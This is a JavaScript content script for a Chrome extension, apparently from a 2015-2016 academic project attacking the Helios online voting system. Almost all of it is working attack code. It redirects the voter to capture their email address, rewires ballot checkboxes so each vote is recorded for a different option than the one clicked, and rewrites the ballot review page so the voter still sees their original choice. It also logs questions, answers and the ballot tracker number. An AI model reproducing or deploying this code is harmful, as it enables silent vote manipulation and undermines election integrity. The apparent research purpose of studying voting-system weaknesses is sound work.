// Author: Milton Li 2015-2016, Newcastle University
// Project: Attack on Helios voting system

var questions = [];
var answers = []

$(document).ready(function() {
  
  var url = $(location).attr('href');
  
  // The URL ends with '#', i.e. the page after the user logins
  if (url.lastIndexOf("#") === (url.length - "#".length)) {
    // Save the current URL user is browsing
    chrome.runtime.sendMessage({type: "setBaseUrl", baseUrl: url});
    
    // Redirect to the URL to read user's email address
    var authUrl = url.replace(".io/", ".io/auth/?return_url=/").replace("#", "");
    window.location.href = authUrl;
  }
  // The page redirected by the code above to read user's email
  else if (url.search("/auth/") !== -1) {
    // Save user's email address
    var emailAddress = $(".row > p > b:first").text();
    chrome.runtime.sendMessage({type: "setUserEmailAddress", emailAddress: emailAddress});
    
    chrome.runtime.sendMessage({type: "getBaseUrl"}, function(response) {
      var baseUrl = JSON.parse(response.baseUrl);
      window.location.href = baseUrl.replace("#", "");
    });
  }
  
  // Save the first question when the user clicks the start button
  $(document).on("click", ':button:contains("Start")', function() {
    questions[0] = $("#answer_form > p > b").text();
    
    var numberOfChoices = $("div[id^='answer_label']").length;
    changeSelectedAnswer(0, numberOfChoices);
    
    // Change the selected answer for the given question number (start from zero)
    function changeSelectedAnswer(questionNumber, numberOfChoices) {
      for (i = 0; i < numberOfChoices; i++) {
        // For example, suppose there are three options and the original choice is {option 0: checked; option 1: unchecked; option 2: unchecked},
        // the tampered result will be overriden to {option 0: unchecked; option 1: checked; option 2: unchecked}
        var onClickString = "BOOTH.click_checkbox(" + questionNumber + ", " + i + ", !this.checked);BOOTH.click_checkbox(" + questionNumber + ", " + (i + 1) % numberOfChoices + ", this.checked);";
        $("#answer_" + questionNumber + "_" + i).attr("onclick", onClickString);
        
        // Modify the class so that the untampered result is shown to the user
        $("#answer_" + questionNumber + "_" + i).on("click", function() {
          if (this.checked) {
            // Select the untampered checkbox
            var originalId = "#" + this.id.replace("answer_", "answer_label_");
            $(originalId).addClass("selected");
            
            // Unselect the tampered checkbox after storing the result behind the scene
            var index = (parseInt(this.id.slice(-1)) + 1) % numberOfChoices;
            $(originalId.slice(0, -1) + index).removeClass("selected");
          } else {
            // Unselect the untampered checkbox
            var originalId = "#" + this.id.replace("answer_", "answer_label_");
            $(originalId).removeClass("selected");
          }
        });
      }
    }
  });
  
  // Save the answer selected by the user on the check box
  $(document).on("click", ".ballot_answer", function() {
    var index = $("input[name='question_num']").val();
    var answer = $("#" + this.id)[0].nextSibling.nodeValue;
    answers[index] = answer;
  });
  
  // Save the questions from question two when the user clicks the next button
  $(document).on('click', ':button[value="Next"]', function() {
    var index = $("input[name='question_num']").val();
    questions[index] = $('#answer_form > p > b').text();
    
    var numberOfChoices = $("div[id^='answer_label']").length
    changeSelectedAnswer(index, numberOfChoices);
    
    // Change the selected answer for the given question number (start from zero)
    function changeSelectedAnswer(questionNumber, numberOfChoices) {
      for (i = 0; i < numberOfChoices; i++) {
        // For example, suppose there are three options and the original choice is {option 0: checked; option 1: unchecked; option 2: unchecked},
        // the tampered result will be overriden to {option 0: unchecked; option 1: checked; option 2: unchecked}
        var onClickString = "BOOTH.click_checkbox(" + questionNumber + ", " + i + ", !this.checked);BOOTH.click_checkbox(" + questionNumber + ", " + (i + 1) % numberOfChoices + ", this.checked);";
        $("#answer_" + questionNumber + "_" + i).attr("onclick", onClickString);
        
        // Modify the class so that the untampered result is shown to the user
        $("#answer_" + questionNumber + "_" + i).on("click", function() {
          if (this.checked) {
            // Select the untampered checkbox
            var originalId = "#" + this.id.replace("answer_", "answer_label_");
            $(originalId).addClass("selected");
            
            // Unselect the tampered checkbox after storing the result behind the scene
            var index = (parseInt(this.id.slice(-1)) + 1) % numberOfChoices;
            $(originalId.slice(0, -1) + index).removeClass("selected");
          } else {
            // Unselect the untampered checkbox
            var originalId = "#" + this.id.replace("answer_", "answer_label_");
            $(originalId).removeClass("selected");
          }
        });
      }
    }
  });
  
  // Save all the questions and answers when the user clicks the proceed button
  $(document).on('click', ':button[value="Proceed"]', function() {
    chrome.runtime.sendMessage(
      {
        type: "setSelectedOption",
        questions: questions,
        answers: answers
      }
    );
  });
  
  // Save smart ballot tracker number
  if ($("#contentbody > p > tt").length) {
    chrome.runtime.sendMessage({
      type: "setBallotTrackerNumber",
      trackerNumber: $("#contentbody > p > tt").text()
    });
  }
});

$("body").mouseenter(function() {
  // seal_div has children implies that ballot review page is launched
  if ($("#seal_div").children().length > 0) {
    // Retrieve the answers selected by the voter
    var originalAnswers;
    chrome.runtime.sendMessage({type: "getAnswers"}, function(response) {
      originalAnswers = JSON.parse(response.answers);
    });
    
    // The divs where the answers are displayed to the voter
    var answerDivs = $("#seal_div > div:eq(1) > div");
    
    // Change the answers for each question
    for (var index = 0; index < answerDivs.length; index++) {
      answerDivs[index].innerHTML = "✓ " + originalAnswers[index];
    }
  }
});